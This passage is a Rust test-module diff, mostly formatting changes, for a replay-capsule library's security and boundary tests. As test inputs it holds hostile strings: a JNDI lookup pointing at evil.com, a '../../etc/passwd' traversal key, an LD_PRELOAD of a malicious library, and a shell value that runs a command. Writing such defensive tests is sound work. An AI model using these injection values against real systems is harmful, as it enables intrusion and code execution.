-            (0..10_000).map(|i| (format!("key_{}", i), format!("value_{}", i))).collect(),
+            (0..10_000)
+                .map(|i| (format!("key_{}", i), format!("value_{}", i)))
+                .collect(),
             // Binary data in metadata
             BTreeMap::from([
                 (
                     "\x00\x01\x02key".to_string(),
                     String::from_utf8_lossy(b"\xFF\xFE\xFDvalue").into_owned(),
                 ),
-                ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
+                (
+                    "normal_key".to_string(),
+                    std::str::from_utf8(&vec![0x80; 1000])
+                        .unwrap_or("fallback")
+                        .to_string(),
+                ),
             ]),
         ];
 
         for (attack_idx, attack_metadata) in metadata_attacks.into_iter().enumerate() {
             let input = CapsuleInput {
                 seq: 1,
-                data: format!("metadata_attack_{}", attack_idx).as_bytes().to_vec(),
+                data: format!("metadata_attack_{}", attack_idx)
+                    .as_bytes()
+                    .to_vec(),
                 metadata: attack_metadata,
             };
 
-            let result = create_capsule(&format!("metadata_attack_{}", attack_idx), vec![input], test_env());
+            let result = create_capsule(
+                &format!("metadata_attack_{}", attack_idx),
+                vec![input],
+                test_env(),
+            );
 
             match result {
                 Ok(capsule) => {
@@ -2650,7 +2875,14 @@ mod tests {
             // Gaps in sequence
             vec![1, 10, 100, 1000, 10000],
             // Near u64::MAX
-            vec![u64::MAX - 5, u64::MAX - 4, u64::MAX - 3, u64::MAX - 2, u64::MAX - 1, u64::MAX],
+            vec![
+                u64::MAX - 5,
+                u64::MAX - 4,
+                u64::MAX - 3,
+                u64::MAX - 2,
+                u64::MAX - 1,
+                u64::MAX,
+            ],
             // Wraparound attempt
             vec![u64::MAX, 0, 1],
             // Descending sequence (invalid)
@@ -2683,21 +2915,31 @@ mod tests {
                     let mut prev_seq = None;
                     for input in &capsule.inputs {
                         if let Some(prev) = prev_seq {
-                            assert!(input.seq > prev,
-                                   "Sequence should be monotonically increasing: {} <= {}", input.seq, prev);
+                            assert!(
+                                input.seq > prev,
+                                "Sequence should be monotonically increasing: {} <= {}",
+                                input.seq,
+                                prev
+                            );
                         }
                         prev_seq = Some(input.seq);
                     }
 
                     // Validation should pass for valid sequences
                     let validation = validate_capsule(&capsule);
-                    assert!(validation.is_ok(),
-                           "Valid sequence {} should pass validation", test_idx);
+                    assert!(
+                        validation.is_ok(),
+                        "Valid sequence {} should pass validation",
+                        test_idx
+                    );
 
                     // Expected outputs should have corresponding sequences
                     for output in &capsule.expected_outputs {
-                        assert!(capsule.inputs.iter().any(|input| input.seq == output.seq),
-                               "Output sequence {} should correspond to an input", output.seq);
+                        assert!(
+                            capsule.inputs.iter().any(|input| input.seq == output.seq),
+                            "Output sequence {} should correspond to an input",
+                            output.seq
+                        );
                     }
 
                     // Test replay with extreme sequence numbers
@@ -2716,8 +2958,10 @@ mod tests {
                     match err {
                         CapsuleError::NonMonotonicInputSequence => {
                             // Expected for descending or duplicate sequences
-                            assert!(test_idx == 4 || test_idx == 5 || test_idx == 2,
-                                   "Non-monotonic error should only occur for invalid sequences");
+                            assert!(
+                                test_idx == 4 || test_idx == 5 || test_idx == 2,
+                                "Non-monotonic error should only occur for invalid sequences"
+                            );
                         }
                         _ => {
                             // Other errors may occur for extreme values
@@ -2746,7 +2990,8 @@ mod tests {
 
             // Carefully add incremented sequence to avoid overflow in test code
             let next_seq = start_seq.saturating_add(increment);
-            if next_seq > start_seq { // Only add if increment actually increased the value
+            if next_seq > start_seq {
+                // Only add if increment actually increased the value
                 test_inputs.push(CapsuleInput {
                     seq: next_seq,
                     data: b"overflow_test_next".to_vec(),
@@ -2761,8 +3006,12 @@ mod tests {
                 Ok(capsule) => {
                     // Verify no sequence overflow occurred
                     for window in capsule.inputs.windows(2) {
-                        assert!(window[1].seq > window[0].seq,
-                               "Sequence overflow detected: {} -> {}", window[0].seq, window[1].seq);
+                        assert!(
+                            window[1].seq > window[0].seq,
+                            "Sequence overflow detected: {} -> {}",
+                            window[0].seq,
+                            window[1].seq
+                        );
                     }
                 }
                 Err(_) => {
@@ -2819,16 +3068,23 @@ mod tests {
             match validation {
                 Ok(_) => {
                     // Valid versions should pass
-                    assert!(version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION,
-                           "Only supported versions should pass validation: {}", version);
+                    assert!(
+                        version >= MIN_FORMAT_VERSION && version <= CURRENT_FORMAT_VERSION,
+                        "Only supported versions should pass validation: {}",
+                        version
+                    );
 
                     // Test serialization/deserialization with valid version
                     let serialized = serde_json::to_string(&test_capsule);
                     assert!(serialized.is_ok(), "Valid version capsule should serialize");
 
                     if let Ok(json_str) = serialized {
-                        let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
-                        assert!(deserialized.is_ok(), "Valid version capsule should deserialize");
+                        let deserialized: Result<ReplayCapsule, _> =
+                            serde_json::from_str(&json_str);
+                        assert!(
+                            deserialized.is_ok(),
+                            "Valid version capsule should deserialize"
+                        );
 
                         if let Ok(reconstructed) = deserialized {
                             assert_eq!(reconstructed.format_version, version);
@@ -2844,9 +3100,14 @@ mod tests {
                     // Invalid versions should be rejected
                     match err {
                         CapsuleError::UnsupportedVersion(v) => {
-                            assert_eq!(v, version, "Error should report the correct unsupported version");
-                            assert!(version < MIN_FORMAT_VERSION || version > CURRENT_FORMAT_VERSION,
-                                   "Only unsupported versions should produce UnsupportedVersion error");
+                            assert_eq!(
+                                v, version,
+                                "Error should report the correct unsupported version"
+                            );
+                            assert!(
+                                version < MIN_FORMAT_VERSION || version > CURRENT_FORMAT_VERSION,
+                                "Only unsupported versions should produce UnsupportedVersion error"
+                            );
                         }
                         _ => {
                             // Other validation errors may occur for extreme values
@@ -2886,7 +3147,8 @@ mod tests {
                 );
 
                 // Should either accept (ignoring unknown fields) or reject gracefully
-                let parse_result: Result<ReplayCapsule, _> = serde_json::from_str(&future_schema_json);
+                let parse_result: Result<ReplayCapsule, _> =
+                    serde_json::from_str(&future_schema_json);
                 match parse_result {
                     Ok(parsed) => {
                         // If parsed, should maintain schema integrity
@@ -2906,10 +3168,10 @@ mod tests {
 
         // Test version compatibility matrix simulation
         let compatibility_tests = vec![
-            (MIN_FORMAT_VERSION, CURRENT_FORMAT_VERSION),  // Min to current
-            (CURRENT_FORMAT_VERSION, MIN_FORMAT_VERSION),  // Current to min
-            (0, CURRENT_FORMAT_VERSION),                    // Invalid to current
-            (CURRENT_FORMAT_VERSION, u32::MAX),            // Current to invalid
+            (MIN_FORMAT_VERSION, CURRENT_FORMAT_VERSION), // Min to current
+            (CURRENT_FORMAT_VERSION, MIN_FORMAT_VERSION), // Current to min
+            (0, CURRENT_FORMAT_VERSION),                  // Invalid to current
+            (CURRENT_FORMAT_VERSION, u32::MAX),           // Current to invalid
         ];
 
         for (from_version, to_version) in compatibility_tests {
@@ -2941,13 +3203,22 @@ mod tests {
             match (original_validation, migrated_validation) {
                 (Ok(_), Ok(_)) => {
                     // Both valid - versions should be in supported range
-                    assert!(from_version >= MIN_FORMAT_VERSION && from_version <= CURRENT_FORMAT_VERSION);
-                    assert!(to_version >= MIN_FORMAT_VERSION && to_version <= CURRENT_FORMAT_VERSION);
+                    assert!(
+                        from_version >= MIN_FORMAT_VERSION
+                            && from_version <= CURRENT_FORMAT_VERSION
+                    );
+                    assert!(
+                        to_version >= MIN_FORMAT_VERSION && to_version <= CURRENT_FORMAT_VERSION
+                    );
                 }
                 (Err(_), Err(_)) => {
                     // Both invalid - at least one version should be unsupported
-                    assert!(from_version < MIN_FORMAT_VERSION || from_version > CURRENT_FORMAT_VERSION ||
-                           to_version < MIN_FORMAT_VERSION || to_version > CURRENT_FORMAT_VERSION);
+                    assert!(
+                        from_version < MIN_FORMAT_VERSION
+                            || from_version > CURRENT_FORMAT_VERSION
+                            || to_version < MIN_FORMAT_VERSION
+                            || to_version > CURRENT_FORMAT_VERSION
+                    );
                 }
                 _ => {
                     // Mixed results indicate version-dependent behavior
@@ -2989,7 +3260,10 @@ mod tests {
                 properties: BTreeMap::from([
                     ("PATH".to_string(), "/malicious:/usr/bin".to_string()),
                     ("LD_PRELOAD".to_string(), "/tmp/malicious.so".to_string()),
-                    ("SHELL".to_string(), "/bin/bash -c 'evil_command'".to_string()),
+                    (
+                        "SHELL".to_string(),
+                        "/bin/bash -c 'evil_command'".to_string(),
+                    ),
                 ]),
             },
             // Binary data in properties
@@ -3002,7 +3276,12 @@ mod tests {
                         "\x00\x01binary_key".to_string(),
                         String::from_utf8_lossy(b"\xFF\xFEbinary_value").into_owned(),
                     ),
-                    ("normal_key".to_string(), std::str::from_utf8(&vec![0x80; 1000]).unwrap_or("fallback").to_string()),
+                    (
+                        "normal_key".to_string(),
+                        std::str::from_utf8(&vec![0x80; 1000])
+                            .unwrap_or("fallback")
+                            .to_string(),
+                    ),
                 ]),
             },
             // Extremely large environment
@@ -3021,7 +3300,10 @@ mod tests {
                 config_hash: "控制字符\u{007F}\u{0001}hash".to_string(),
                 properties: BTreeMap::from([
                     ("🚀💻key".to_string(), "🎬🔄value".to_string()),
-                    ("\u{200B}\u{200C}invisible".to_string(), "\u{FEFF}bom_value".to_string()),
+                    (
+                        "\u{200B}\u{200C}invisible".to_string(),
+                        "\u{FEFF}bom_value".to_string(),
+                    ),
                 ]),
             },
         ];
@@ -3029,11 +3311,14 @@ mod tests {
         for (env_idx, test_env) in injection_environments.into_iter().enumerate() {
             let test_input = CapsuleInput {
                 seq: 1,
-                data: format!("env_injection_test_{}", env_idx).as_bytes().to_vec(),
+                data: format!("env_injection_test_{}", env_idx)
+                    .as_bytes()
+                    .to_vec(),
                 metadata: BTreeMap::new(),
             };
 
-            let result = create_capsule(&format!("env_test_{}", env_idx), vec![test_input], test_env);
+            let result =
+                create_capsule(&format!("env_test_{}", env_idx), vec![test_input], test_env);
 
             match result {
                 Ok(capsule) => {
@@ -3047,8 +3332,14 @@ mod tests {
                     assert!(!capsule.environment.config_hash.contains('\0'));
 
                     for (key, value) in &capsule.environment.properties {
-                        assert!(!key.contains('\0'), "Environment keys should not contain null bytes");
-                        assert!(!value.contains('\0'), "Environment values should not contain null bytes");
+                        assert!(
+                            !key.contains('\0'),
+                            "Environment keys should not contain null bytes"
+                        );
+                        assert!(
+                            !value.contains('\0'),
+                            "Environment values should not contain null bytes"
+                        );
                     }
 
                     // Test serialization safety
@@ -3059,14 +3350,27 @@ mod tests {
                             assert!(!json_str.contains("\0"));
 
                             // Should be deserializable
-                            let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
-                            assert!(deserialized.is_ok(), "Injection-resistant capsule should deserialize");
+                            let deserialized: Result<ReplayCapsule, _> =
+                                serde_json::from_str(&json_str);
+                            assert!(
+                                deserialized.is_ok(),
+                                "Injection-resistant capsule should deserialize"
+                            );
 
                             if let Ok(reconstructed) = deserialized {
                                 // Reconstructed environment should maintain integrity
-                                assert_eq!(reconstructed.environment.runtime_version, capsule.environment.runtime_version);
-                                assert_eq!(reconstructed.environment.platform, capsule.environment.platform);
-                                assert_eq!(reconstructed.environment.properties.len(), capsule.environment.properties.len());
+                                assert_eq!(
+                                    reconstructed.environment.runtime_version,
+                                    capsule.environment.runtime_version
+                                );
+                                assert_eq!(
+                                    reconstructed.environment.platform,
+                                    capsule.environment.platform
+                                );
+                                assert_eq!(
+                                    reconstructed.environment.properties.len(),
+                                    capsule.environment.properties.len()
+                                );
                             }
                         }
                         Err(_) => {
@@ -3110,8 +3414,9 @@ mod tests {
             metadata: BTreeMap::new(),
         };
 
-        let original_capsule = create_capsule("hash_test", vec![base_input.clone()], base_env.clone())
-            .expect("base capsule should create");
+        let original_capsule =
+            create_capsule("hash_test", vec![base_input.clone()], base_env.clone())
+                .expect("base capsule should create");
 
         // Modify environment in various ways and test hash sensitivity
         let environment_modifications = vec![
@@ -3210,7 +3515,11 @@ mod tests {
                 metadata: BTreeMap::new(),
             };
 
-            let result = create_capsule(&format!("size_test_{}", size_idx), vec![large_input], test_env());
+            let result = create_capsule(
+                &format!("size_test_{}", size_idx),
+                vec![large_input],
+                test_env(),
+            );
 
             match result {
                 Ok(capsule) => {
@@ -3229,7 +3538,12 @@ mod tests {
                     match validation {
                         Ok(_) => {
                             // Large data should not cause excessive validation time
-                            assert!(validation_time.as_secs() < 30, "Validation took too long for size {}: {:?}", original_size, validation_time);
+                            assert!(
+                                validation_time.as_secs() < 30,
+                                "Validation took too long for size {}: {:?}",
+                                original_size,
+                                validation_time
+                            );
 
                             // Test serialization with size limits
                             let serialization_start = std::time::Instant::now();
@@ -3239,21 +3553,35 @@ mod tests {
                             match serialized {
                                 Ok(_json_str) => {
                                     // Serialization should complete in reasonable time
-                                    assert!(serialization_time.as_secs() < 60, "Serialization took too long for size {}: {:?}", original_size, serialization_time);
+                                    assert!(
+                                        serialization_time.as_secs() < 60,
+                                        "Serialization took too long for size {}: {:?}",
+                                        original_size,
+                                        serialization_time
+                                    );
 
                                     // Test deserialization
                                     // Note: Skip for very large sizes to avoid test timeout
                                     if original_size < 10_000_000 {
                                         let deserialization_start = std::time::Instant::now();
-                                        let _deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&_json_str);
+                                        let _deserialized: Result<ReplayCapsule, _> =
+                                            serde_json::from_str(&_json_str);
                                         let deserialization_time = deserialization_start.elapsed();
 
-                                        assert!(deserialization_time.as_secs() < 60, "Deserialization took too long for size {}: {:?}", original_size, deserialization_time);
+                                        assert!(
+                                            deserialization_time.as_secs() < 60,
+                                            "Deserialization took too long for size {}: {:?}",
+                                            original_size,
+                                            deserialization_time
+                                        );
                                     }
                                 }
                                 Err(_) => {
                                     // Large data may fail to serialize due to memory limits
-                                    assert!(original_size > 1_000_000, "Reasonable sizes should serialize successfully");
+                                    assert!(
+                                        original_size > 1_000_000,
+                                        "Reasonable sizes should serialize successfully"
+                                    );
                                 }
                             }
 
@@ -3266,7 +3594,12 @@ mod tests {
                                 match replay_result {
                                     Ok(_) => {
                                         // Replay should complete in reasonable time
-                                        assert!(replay_time.as_secs() < 120, "Replay took too long for size {}: {:?}", original_size, replay_time);
+                                        assert!(
+                                            replay_time.as_secs() < 120,
+                                            "Replay took too long for size {}: {:?}",
+                                            original_size,
+                                            replay_time
+                                        );
                                     }
                                     Err(_) => {
                                         // Large data may cause replay failures due to resource limits
@@ -3276,23 +3609,29 @@ mod tests {
                         }
                         Err(_) => {
                             // Large data may be rejected during validation
-                            assert!(original_size > 10_000_000, "Reasonable sizes should pass validation");
+                            assert!(
+                                original_size > 10_000_000,
+                                "Reasonable sizes should pass validation"
+                            );
                         }
                     }
                 }
                 Err(_) => {
                     // Very large data may be rejected during creation
-                    assert!(original_size > 50_000_000, "Reasonable sizes should create successfully");
+                    assert!(
+                        original_size > 50_000_000,
+                        "Reasonable sizes should create successfully"
+                    );
                 }
             }
         }
 
         // Test multiple large inputs (memory pressure multiplication)
         let multi_input_sizes = vec![
-            vec![vec![0; 100_000], vec![1; 100_000]],                    // Two 100KB inputs
+            vec![vec![0; 100_000], vec![1; 100_000]], // Two 100KB inputs
             vec![vec![0; 500_000], vec![1; 500_000], vec![2; 500_000]], // Three 500KB inputs
-            (0..100).map(|i| vec![i as u8; 10_000]).collect(),          // 100 small inputs
-            (0..10).map(|i| vec![i as u8; 1_000_000]).collect(),        // 10 large inputs
+            (0..100).map(|i| vec![i as u8; 10_000]).collect(), // 100 small inputs
+            (0..10).map(|i| vec![i as u8; 1_000_000]).collect(), // 10 large inputs
         ];
 
         for (multi_idx, input_data_list) in multi_input_sizes.into_iter().enumerate() {
@@ -3308,12 +3647,17 @@ mod tests {
                 })
                 .collect();
 
-            let result = create_capsule(&format!("multi_size_test_{}", multi_idx), inputs, test_env());
+            let result = create_capsule(
+                &format!("multi_size_test_{}", multi_idx),
+                inputs,
+                test_env(),
+            );
 
             match result {
                 Ok(capsule) => {
                     // Should handle multiple large inputs gracefully
-                    let actual_total: usize = capsule.inputs.iter().map(|input| input.data.len()).sum();
+                    let actual_total: usize =
+                        capsule.inputs.iter().map(|input| input.data.len()).sum();
                     assert_eq!(actual_total, total_size);
 
                     // Test that operations remain efficient with multiple large inputs
@@ -3322,11 +3666,19 @@ mod tests {
                     let validation_time = start_time.elapsed();
 
                     // Should not cause excessive processing time
-                    assert!(validation_time.as_secs() < 60, "Multi-input validation took too long for total size {}: {:?}", total_size, validation_time);
+                    assert!(
+                        validation_time.as_secs() < 60,
+                        "Multi-input validation took too long for total size {}: {:?}",
+                        total_size,
+                        validation_time
+                    );
                 }
                 Err(_) => {
                     // Multiple large inputs may exceed memory limits
-                    assert!(total_size > 10_000_000, "Reasonable total sizes should succeed");
+                    assert!(
+                        total_size > 10_000_000,
+                        "Reasonable total sizes should succeed"
+                    );
                 }
             }
         }
@@ -3359,7 +3711,8 @@ mod tests {
             // Unicode in hash
             "控制字符abc123".repeat(4),
             // Null bytes
-            format!("{}{}{}",
+            format!(
+                "{}{}{}",
                 "abc123".repeat(5),
                 "\x00\x01\x02",
                 "def456".repeat(5)
@@ -3387,8 +3740,12 @@ mod tests {
             };
 
             // Create capsule first with valid hash, then manipulate
-            let mut capsule = create_capsule(&format!("hash_test_{}", hash_idx), vec![test_input], test_env())
-                .expect("base capsule should create");
+            let mut capsule = create_capsule(
+                &format!("hash_test_{}", hash_idx),
+                vec![test_input],
+                test_env(),
+            )
+            .expect("base capsule should create");
 
             // Manipulate the output hash
             if !capsule.expected_outputs.is_empty() {
@@ -3396,7 +3753,9 @@ mod tests {
             } else {
                 capsule.expected_outputs.push(CapsuleOutput {
                     seq: 1,
-                    data: format!("manipulated_output_{}", hash_idx).as_bytes().to_vec(),
+                    data: format!("manipulated_output_{}", hash_idx)
+                        .as_bytes()
+                        .to_vec(),
                     output_hash: malicious_hash.clone(),
                 });
             }
@@ -3425,11 +3784,15 @@ mod tests {
                                 assert!(!json_str.contains("rm -rf"));
 
                                 // Should be deserializable
-                                let deserialized: Result<ReplayCapsule, _> = serde_json::from_str(&json_str);
+                                let deserialized: Result<ReplayCapsule, _> =
+                                    serde_json::from_str(&json_str);
                                 match deserialized {
                                     Ok(reconstructed) => {
                                         // Hash should be preserved correctly
-                                        assert_eq!(reconstructed.expected_outputs[0].output_hash, malicious_hash);
+                                        assert_eq!(
+                                            reconstructed.expected_outputs[0].output_hash,
+                                            malicious_hash
+                                        );
                                     }
                                     Err(_) => {
                                         // Extreme hash content may cause deserialization failure
@@ -3470,32 +3833,49 @@ mod tests {
         for collision_test in 0..1000 {
             let test_input = CapsuleInput {
                 seq: 1,
-                data: format!("collision_test_{}", collision_test).as_bytes().to_vec(),
+                data: format!("collision_test_{}", collision_test)
+                    .as_bytes()
+                    .to_vec(),
                 metadata: BTreeMap::new(),
             };
 
-            if let Ok(capsule) = create_capsule(&format!("collision_{}", collision_test), vec![test_input], test_env()) {
+            if let Ok(capsule) = create_capsule(
+                &format!("collision_{}", collision_test),
+                vec![test_input],
+                test_env(),
+            ) {
                 if !capsule.expected_outputs.is_empty() {
                     let output_hash = &capsule.expected_outputs[0].output_hash;
 
                     // Check for accidental hash collisions
-                    assert!(!observed_hashes.contains(output_hash),
-                           "Hash collision detected: {} appeared multiple times", output_hash);
+                    assert!(
+                        !observed_hashes.contains(output_hash),
+                        "Hash collision detected: {} appeared multiple times",
+                        output_hash
+                    );
 
                     observed_hashes.insert(output_hash.clone());
 
                     // Hash should be deterministic (same input produces same hash)
                     let test_input_dup = CapsuleInput {
                         seq: 1,
-                        data: format!("collision_test_{}", collision_test).as_bytes().to_vec(),
+                        data: format!("collision_test_{}", collision_test)
+                            .as_bytes()
+                            .to_vec(),
                         metadata: BTreeMap::new(),
                     };
 
-                    if let Ok(capsule_dup) = create_capsule(&format!("collision_dup_{}", collision_test), vec![test_input_dup], test_env()) {
+                    if let Ok(capsule_dup) = create_capsule(
+                        &format!("collision_dup_{}", collision_test),
+                        vec![test_input_dup],
+                        test_env(),
+                    ) {
                         if !capsule_dup.expected_outputs.is_empty() {
                             // Same input should produce same hash (deterministic)
-                            assert_eq!(capsule_dup.expected_outputs[0].output_hash, *output_hash,
-                                     "Hash should be deterministic for identical inputs");
+                            assert_eq!(
+                                capsule_dup.expected_outputs[0].output_hash, *output_hash,
+                                "Hash should be deterministic for identical inputs"
+                            );
                         }
                     }
                 }
@@ -3517,11 +3897,17 @@ mod tests {
             for preimage_attempt in 0..1000 {
                 let attempt_input = CapsuleInput {
                     seq: 1,
-                    data: format!("preimage_attempt_{}", preimage_attempt).as_bytes().to_vec(),
+                    data: format!("preimage_attempt_{}", preimage_attempt)
+                        .as_bytes()
+                        .to_vec(),
                     metadata: BTreeMap::new(),
                 };
 
-                if let Ok(capsule) = create_capsule(&format!("preimage_{}", preimage_attempt), vec![attempt_input], test_env()) {
+                if let Ok(capsule) = create_capsule(
+                    &format!("preimage_{}", preimage_attempt),
+                    vec![attempt_input],
+                    test_env(),
+                ) {
                     if !capsule.expected_outputs.is_empty() {
                         if capsule.expected_outputs[0].output_hash == target_hash {
                             found_preimage = true;
@@ -3532,7 +3918,11 @@ mod tests {
             }
 
             // Should be extremely unlikely to find preimage by chance
-            assert!(!found_preimage, "Accidentally found preimage for target hash: {}", target_hash);
+            assert!(
+                !found_preimage,
+                "Accidentally found preimage for target hash: {}",
+                target_hash
+            );
         }
     }
 
@@ -3546,11 +3936,17 @@ mod tests {
         for concurrent_idx in 0..20 {
             let input = CapsuleInput {
                 seq: 1,
-                data: format!("concurrent_test_{}", concurrent_idx).as_bytes().to_vec(),
+                data: format!("concurrent_test_{}", concurrent_idx)
+                    .as_bytes()
+                    .to_vec(),
                 metadata: BTreeMap::new(),
             };
 
-            if let Ok(capsule) = create_capsule(&format!("concurrent_{}", concurrent_idx), vec![input], base_env.clone()) {
+            if let Ok(capsule) = create_capsule(
+                &format!("concurrent_{}", concurrent_idx),
+                vec![input],
+                base_env.clone(),
+            ) {
                 test_capsules.push(capsule);
             }
         }
@@ -3593,14 +3989,20 @@ mod tests {
                     // Replay should be deterministic
                     let second_replay = replay_and_verify(&test_capsules[idx]);
                     // Should get same result on second replay
-                    assert!(second_replay.is_ok() == result.is_ok(),
-                           "Replay should be deterministic for capsule {}", idx);
+                    assert!(
+                        second_replay.is_ok() == result.is_ok(),
+                        "Replay should be deterministic for capsule {}",
+                        idx
+                    );
                 }
                 Err(_) => {
                     // Failures should also be deterministic
                     let second_replay = replay_and_verify(&test_capsules[idx]);
-                    assert!(second_replay.is_err(),
-                           "Replay failures should be deterministic for capsule {}", idx);
+                    assert!(
+                        second_replay.is_err(),
+                        "Replay failures should be deterministic for capsule {}",
+                        idx
+                    );
                 }
             }
         }
@@ -3613,7 +4015,10 @@ mod tests {
                     match deserialized {
                         Ok(reconstructed) => {
                             assert_eq!(reconstructed.capsule_id, test_capsules[idx].capsule_id);
-                            assert_eq!(reconstructed.format_version, test_capsules[idx].format_version);
+                            assert_eq!(
+                                reconstructed.format_version,
+                                test_capsules[idx].format_version
+                            );
                             assert_eq!(reconstructed.inputs.len(), test_capsules[idx].inputs.len());
                         }
                         Err(_) => {
@@ -3624,8 +4029,11 @@ mod tests {
                 Err(_) => {
                     // Serialization failure should be reproducible
                     let second_serialization = serde_json::to_string(&test_capsules[idx]);
-                    assert!(second_serialization.is_err(),
-                           "Serialization failures should be deterministic for capsule {}", idx);
+                    assert!(
+                        second_serialization.is_err(),
+                        "Serialization failures should be deterministic for capsule {}",
+                        idx
+                    );
                 }
             }
         }
@@ -3638,7 +4046,11 @@ mod tests {
                 metadata: BTreeMap::new(),
             };
 
-            let create_result = create_capsule(&format!("rapid_{}", cycle), vec![rapid_input], base_env.clone());
+            let create_result = create_capsule(
+                &format!("rapid_{}", cycle),
+                vec![rapid_input],
+                base_env.clone(),
+            );
 
             match create_result {
                 Ok(capsule) => {
@@ -3680,8 +4092,11 @@ mod tests {
             let original_validation = validate_capsule(&test_capsules[0]);
 
             // Results should be different (corruption detected)
-            assert_ne!(corruption_validation.is_ok(), original_validation.is_ok() ||
-                      corruption_validation.is_err(), "Corruption should be detectable");
+            assert_ne!(
+                corruption_validation.is_ok(),
+                original_validation.is_ok() || corruption_validation.is_err(),
+                "Corruption should be detectable"
+            );
 
             // Replay should also detect corruption
             let corruption_replay = replay_and_verify(&corruption_capsule);
@@ -3691,8 +4106,10 @@ mod tests {
             match (original_replay, corruption_replay) {
                 (Ok(original_verified), Ok(corrupted_verified)) => {
                     // If both succeed, verification results should differ
-                    assert_ne!(original_verified, corrupted_verified,
-                             "Corruption should be detected during replay verification");
+                    assert_ne!(
+                        original_verified, corrupted_verified,
+                        "Corruption should be detected during replay verification"
+                    );
                 }
                 _ => {
                     // Different error patterns are also acceptable
@@ -3703,21 +4120,37 @@ mod tests {
         // Final integrity check on all test capsules
         for (idx, capsule) in test_capsules.iter().enumerate() {
             // Original capsules should remain uncorrupted
-            assert!(!capsule.capsule_id.is_empty(), "Capsule {} ID should not be empty", idx);
-            assert_eq!(capsule.format_version, CURRENT_FORMAT_VERSION, "Capsule {} version should be current", idx);
-            assert!(!capsule.inputs.is_empty(), "Capsule {} should have inputs", idx);
+            assert!(
+                !capsule.capsule_id.is_empty(),
+                "Capsule {} ID should not be empty",
+                idx
+            );
+            assert_eq!(
+                capsule.format_version, CURRENT_FORMAT_VERSION,
+                "Capsule {} version should be current",
+                idx
+            );
+            assert!(
+                !capsule.inputs.is_empty(),
+                "Capsule {} should have inputs",
+                idx
+            );
 
             // Should still validate correctly
             let final_validation = validate_capsule(capsule);
-            assert!(final_validation.is_ok(), "Capsule {} should still validate after concurrent operations", idx);
+            assert!(
+                final_validation.is_ok(),
+                "Capsule {} should still validate after concurrent operations",
+                idx
+            );
         }
     }
 
     #[cfg(test)]
     mod replay_capsule_comprehensive_security_and_boundary_tests {
         use super::*;
-        use std::collections::HashMap;
         use crate::security::constant_time;
+        use std::collections::HashMap;
 
         #[test]
         fn test_capsule_input_data_injection_and_overflow_attacks() {
@@ -3735,24 +4168,55 @@ mod tests {
 
             // Attack 2: Integer overflow in sequence numbers
             let overflow_inputs = vec![
-                CapsuleInput { seq: 0, data: vec![1], metadata: BTreeMap::new() },
-                CapsuleInput { seq: u64::MAX, data: vec![2], metadata: BTreeMap::new() },
-                CapsuleInput { seq: u64::MAX - 1, data: vec![3], metadata: BTreeMap::new() },
-                CapsuleInput { seq: 1, data: vec![4], metadata: BTreeMap::new() },
+                CapsuleInput {
+                    seq: 0,
+                    data: vec![1],
+                    metadata: BTreeMap::new(),
+                },
+                CapsuleInput {
+                    seq: u64::MAX,
+                    data: vec![2],
+                    metadata: BTreeMap::new(),
+                },
+                CapsuleInput {
+                    seq: u64::MAX - 1,
+                    data: vec![3],
+                    metadata: BTreeMap::new(),
+                },
+                CapsuleInput {
+                    seq: 1,
+                    data: vec![4],
+                    metadata: BTreeMap::new(),
+                },
             ];
 
             for input in &overflow_inputs {
-                assert!(input.seq <= u64::MAX, "Sequence number should be within bounds");
+                assert!(
+                    input.seq <= u64::MAX,
+                    "Sequence number should be within bounds"
+                );
                 assert!(!input.data.is_empty(), "Input data should not be empty");
             }
 
             // Attack 3: Metadata injection with malicious keys/values
             let mut malicious_metadata = BTreeMap::new();
-            malicious_metadata.insert("\x00\x01null_bytes".to_string(), "value_with_nulls\x00\x01".to_string());
-            malicious_metadata.insert("../../etc/passwd".to_string(), "path_traversal_key".to_string());
-            malicious_metadata.insert("${jndi:ldap://evil.com}".to_string(), "injection_attempt".to_string());
+            malicious_metadata.insert(
+                "\x00\x01null_bytes".to_string(),
+                "value_with_nulls\x00\x01".to_string(),
+            );
+            malicious_metadata.insert(
+                "../../etc/passwd".to_string(),
+                "path_traversal_key".to_string(),
+            );
+            malicious_metadata.insert(
+                "${jndi:ldap://evil.com}".to_string(),
+                "injection_attempt".to_string(),
+            );
             malicious_metadata.insert("very_long_key".repeat(1000), "x".repeat(10000));
-            malicious_metadata.insert("unicode_🦀_🔒_⚡".to_string(), "emoji_injection".to_string());
+            malicious_metadata.insert(
+                "unicode_🦀_🔒_⚡".to_string(),
+                "emoji_injection".to_string(),
+            );
 
             let injection_input = CapsuleInput {
                 seq: 42,
@@ -3767,10 +4231,10 @@ mod tests {
 
             // Attack 4: Binary data corruption and format confusion
             let binary_payloads = vec![
-                vec![0x00; 1000],                    // All nulls
-                vec![0xFF; 1000],                    // All ones
+                vec![0x00; 1000],                       // All nulls
+                vec![0xFF; 1000],                       // All ones
                 (0..=255).cycle().take(1000).collect(), // Repeating byte pattern
-                vec![0x7F, 0xFF, 0x80, 0x00, 0x01], // Mixed binary data
+                vec![0x7F, 0xFF, 0x80, 0x00, 0x01],     // Mixed binary data
             ];
 
             for (i, payload) in binary_payloads.iter().enumerate() {
@@ -3780,20 +4244,37 @@ mod tests {
                     metadata: BTreeMap::new(),
                 };
 
-                assert_eq!(binary_input.data, *payload, "Binary payload should be preserved exactly");
+                assert_eq!(
+                    binary_input.data, *payload,
+                    "Binary payload should be preserved exactly"
+                );
                 assert!(binary_input.seq < 10, "Sequence should be reasonable");
             }
 
             // Attack 5: Empty and boundary condition inputs
             let boundary_inputs = vec![
-                CapsuleInput { seq: 0, data: vec![], metadata: BTreeMap::new() }, // Empty data
-                CapsuleInput { seq: u64::MAX, data: vec![42], metadata: BTreeMap::new() }, // Max sequence
+                CapsuleInput {
+                    seq: 0,
+                    data: vec![],
+                    metadata: BTreeMap::new(),
+                }, // Empty data
+                CapsuleInput {
+                    seq: u64::MAX,
+                    data: vec![42],
+                    metadata: BTreeMap::new(),
+                }, // Max sequence
             ];
 
             for input in boundary_inputs {
                 // Should handle empty data gracefully
-                assert!(input.data.len() <= 1, "Boundary input should be small or empty");
-                assert!(input.seq == 0 || input.seq == u64::MAX, "Should test boundary sequences");
+                assert!(
+                    input.data.len() <= 1,
